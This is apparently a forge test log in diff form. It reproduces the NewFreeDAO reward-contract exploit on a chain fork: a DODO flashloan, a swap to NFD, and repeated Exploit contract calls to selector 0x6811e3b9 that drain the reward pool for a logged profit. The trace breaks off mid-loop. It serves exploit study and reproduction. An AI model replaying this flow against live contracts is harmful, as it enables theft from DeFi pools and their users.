@@ -1,0 +1,1287 @@
+Compiling 28 files with Solc 0.8.25
+Solc 0.8.25 finished in 1.35s
+Compiler run successful with warnings:
+Warning (2519): This declaration shadows an existing declaration.
+   --> src/test/interface.sol:886:5:
+    |
+886 |     function WETH() external view returns (address);
+    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1598:5:
+     |
+1598 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1850:5:
+     |
+1850 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:2560:5:
+     |
+2560 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:3759:5:
+     |
+3759 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (9302): Return value of low-level calls not used.
+   --> src/test/2022-09/NewFreeDAO_exp.sol:102:9:
+    |
+102 |         rewardContract.call(abi.encode(bytes4(0x6811e3b9)));
+    |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+
+Ran 1 test for script/Exploit-template_new.sol:ExploitScript
+[PASS] testExploit() (gas: 20485)
+Logs:
+  Attacker ETH Balance Before exploit: 0.000000000000000000
+  Attacker ETH Balance After exploit: 0.000000000000000000
+
+Traces:
+  [20485] ExploitScript::testExploit()
+    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   └─ ← [Return] 
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 252.47ms (120.61µs CPU time)
+
+Ran 1 test for src/test/2022-09/NewFreeDAO_exp.sol:Attacker
+[PASS] testExploit() (gas: 50845792)
+Logs:
+  ---------- Reproduce Attack Tx1 ----------
+  Flashloan 250 WBNB from DODO DLP...
+  Swap 250 WBNB to NFD...
+  [*] NFD balance before attack: 6313508.973101744640040048
+  Abuse the Reward Contract...
+  [*] NFD balance after attack: 343323371.795084477753627468
+  Swap the profit...
+  Repay the flashloan...
+  Attacker's Net Profit: 2952.971303206254291601
+
+Traces:
+  [50882492] Attacker::testExploit()
+    ├─ [0] console::log("Flashloan 250 WBNB from DODO DLP...") [staticcall]
+    │   └─ ← [Stop] 
+    ├─ [50875538] DODO::flashLoan(0, 250000000000000000000 [2.5e20], Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x000000000000000000000000d534fae679f7f02364d177e9d44f1d15963c0dd7000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c00000000000000000000000000000000000000000000000d8d726b7177a80000)
+    │   ├─ [50872827] 0x409E377A7AfFB1FD3369cfc24880aD58895D1dD9::flashLoan(0, 250000000000000000000 [2.5e20], Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x000000000000000000000000d534fae679f7f02364d177e9d44f1d15963c0dd7000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c00000000000000000000000000000000000000000000000d8d726b7177a80000) [delegatecall]
+    │   │   ├─ [29962] WBNB::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 250000000000000000000 [2.5e20])
+    │   │   │   ├─ emit Transfer(from: DODO: [0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 250000000000000000000 [2.5e20])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [50813943] Attacker::DVMFlashLoanCall(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 250000000000000000000 [2.5e20], 0x000000000000000000000000d534fae679f7f02364d177e9d44f1d15963c0dd7000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c00000000000000000000000000000000000000000000000d8d726b7177a80000)
+    │   │   │   ├─ [534] WBNB::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 250000000000000000000 [2.5e20]
+    │   │   │   ├─ [0] console::log("Swap 250 WBNB to NFD...") [staticcall]
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [24420] WBNB::approve(PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─ emit Approval(owner: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [231128] PancakeRouter::swapExactTokensForTokensSupportingFeeOnTransferTokens(250000000000000000000 [2.5e20], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x55d398326f99059fF775485246999027B3197955, 0x38C63A5D3f206314107A7a9FE8cBBa29D629D4F9], Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1662602962 [1.662e9])
+    │   │   │   │   ├─ [8225] WBNB::transferFrom(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, 250000000000000000000 [2.5e20])
+    │   │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, value: 250000000000000000000 [2.5e20])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [8855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [2893] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 79816744634862948831458793 [7.981e25], 285691344537148023026067 [2.856e23], 1662602962 [1.662e9]
+    │   │   │   │   ├─ [534] WBNB::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 285941344537148023026067 [2.859e23]
+    │   │   │   │   ├─ [39264] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::swap(69609885313074755141311 [6.96e22], 0, 0x26C0623847637095655B2868C3182B2285bDAeAf, 0x)
+    │   │   │   │   │   ├─ [12871] USDT::transfer(0x26C0623847637095655B2868C3182B2285bDAeAf, 69609885313074755141311 [6.96e22])
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, to: 0x26C0623847637095655B2868C3182B2285bDAeAf, value: 69609885313074755141311 [6.96e22])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [531] USDT::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 79747134749549874076317482 [7.974e25]
+    │   │   │   │   │   ├─ [534] WBNB::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 285941344537148023026067 [2.859e23]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 79747134749549874076317482 [7.974e25], reserve1: 285941344537148023026067 [2.859e23])
+    │   │   │   │   │   ├─ emit Swap(sender: PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 250000000000000000000 [2.5e20], amount0Out: 69609885313074755141311 [6.96e22], amount1Out: 0, to: 0x26C0623847637095655B2868C3182B2285bDAeAf)
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2893] 0x26C0623847637095655B2868C3182B2285bDAeAf::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 137951665541650047066318528 [1.379e26], 1326378930534488755288383 [1.326e24], 1662602905 [1.662e9]
+    │   │   │   │   ├─ [531] USDT::balanceOf(0x26C0623847637095655B2868C3182B2285bDAeAf) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1395988815847563510429694 [1.395e24]
+    │   │   │   │   ├─ [146215] 0x26C0623847637095655B2868C3182B2285bDAeAf::swap(6862509753371461565260922 [6.862e24], 0, Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   │   ├─ [109520] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6862509753371461565260922 [6.862e24])
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x26C0623847637095655B2868C3182B2285bDAeAf, to: 0x26C0623847637095655B2868C3182B2285bDAeAf, value: 549000780269716925220872 [5.49e23])
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x26C0623847637095655B2868C3182B2285bDAeAf, to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 6313508973101744640040028 [6.313e24])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(0x26C0623847637095655B2868C3182B2285bDAeAf) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 131638156568548302426278480 [1.316e26]
+    │   │   │   │   │   ├─ [531] USDT::balanceOf(0x26C0623847637095655B2868C3182B2285bDAeAf) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1395988815847563510429694 [1.395e24]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 131638156568548302426278480 [1.316e26], reserve1: 1395988815847563510429694 [1.395e24])
+    │   │   │   │   │   ├─ emit Swap(sender: PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 549000780269716925220874 [5.49e23], amount1In: 69609885313074755141311 [6.96e22], amount0Out: 6862509753371461565260922 [6.862e24], amount1Out: 0, to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 6313508973101744640040048 [6.313e24]
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 6313508973101744640040048 [6.313e24]
+    │   │   │   ├─ emit log_named_decimal_uint(key: "[*] NFD balance before attack", val: 6313508973101744640040048 [6.313e24], decimals: 18)
+    │   │   │   ├─ [0] console::log("Abuse the Reward Contract...") [staticcall]
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 6313508973101744640040048 [6.313e24]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 6313508973101744640040048 [6.313e24])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 6313508973101744640040000 [6.313e24])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [75608] Exploit::abuse()
+    │   │   │   │   ├─ [57961] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 6313508973101744640040047 [6.313e24]
+    │   │   │   │   │   ├─ [19644] NFD::transfer(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 525283946562065154051331 [5.252e23])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 525283946562065154051300 [5.252e23])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 6838792919663809794091378 [6.838e24]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6838792919663809794091378 [6.838e24])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 6838792919663809794091300 [6.838e24])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0x2e234DAe75C793f67A35089C9d99245E1C58470b
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 6838792919663809794091378 [6.838e24]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 6838792919663809794091378 [6.838e24])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], value: 6838792919663809794091300 [6.838e24])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 6838792919663809794091377 [6.838e24]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 568987570916028974868402 [5.689e23])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], value: 568987570916028974868400 [5.689e23])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 7407780490579838768959779 [7.407e24]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 7407780490579838768959779 [7.407e24])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 7407780490579838768959700 [7.407e24])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 7407780490579838768959779 [7.407e24]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 7407780490579838768959779 [7.407e24])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], value: 7407780490579838768959700 [7.407e24])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 7407780490579838768959778 [7.407e24]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 616327336816242585577453 [6.163e23])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], value: 616327336816242585577400 [6.163e23])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 8024107827396081354537231 [8.024e24]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 8024107827396081354537231 [8.024e24])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 8024107827396081354537200 [8.024e24])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 8024107827396081354537231 [8.024e24]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 8024107827396081354537231 [8.024e24])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], value: 8024107827396081354537200 [8.024e24])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 8024107827396081354537230 [8.024e24]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 667605771239353968697497 [6.676e23])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], value: 667605771239353968697400 [6.676e23])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 8691713598635435323234727 [8.691e24]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 8691713598635435323234727 [8.691e24])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 8691713598635435323234700 [8.691e24])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0xc7183455a4C133Ae270771860664b6B7ec320bB1
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 8691713598635435323234727 [8.691e24]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], 8691713598635435323234727 [8.691e24])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], value: 8691713598635435323234700 [8.691e24])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0xc7183455a4C133Ae270771860664b6B7ec320bB1]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 8691713598635435323234726 [8.691e24]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], 723150571406468218893129 [7.231e23])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], value: 723150571406468218893100 [7.231e23])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0xc7183455a4C133Ae270771860664b6B7ec320bB1]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 9414864170041903542127855 [9.414e24]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 9414864170041903542127855 [9.414e24])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 9414864170041903542127800 [9.414e24])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0xa0Cb889707d426A7A386870A03bc70d1b0697598
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 9414864170041903542127855 [9.414e24]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0xa0Cb889707d426A7A386870A03bc70d1b0697598], 9414864170041903542127855 [9.414e24])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0xa0Cb889707d426A7A386870A03bc70d1b0697598], value: 9414864170041903542127800 [9.414e24])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0xa0Cb889707d426A7A386870A03bc70d1b0697598]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 9414864170041903542127854 [9.414e24]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0xa0Cb889707d426A7A386870A03bc70d1b0697598], 783316698947486374705037 [7.833e23])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0xa0Cb889707d426A7A386870A03bc70d1b0697598], value: 783316698947486374705000 [7.833e23])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0xa0Cb889707d426A7A386870A03bc70d1b0697598]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 10198180868989389916832891 [1.019e25]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10198180868989389916832891 [1.019e25])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0xa0Cb889707d426A7A386870A03bc70d1b0697598], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 10198180868989389916832800 [1.019e25])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0x1d1499e622D69689cdf9004d05Ec547d650Ff211
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 10198180868989389916832891 [1.019e25]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211], 10198180868989389916832891 [1.019e25])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211], value: 10198180868989389916832800 [1.019e25])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 10198180868989389916832890 [1.019e25]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211], 848488648299917241080496 [8.484e23])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211], value: 848488648299917241080400 [8.484e23])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 11046669517289307157913386 [1.104e25]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 11046669517289307157913386 [1.104e25])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 11046669517289307157913300 [1.104e25])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0xA4AD4f68d0b91CFD19687c881e50f3A00242828c
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 11046669517289307157913386 [1.104e25]
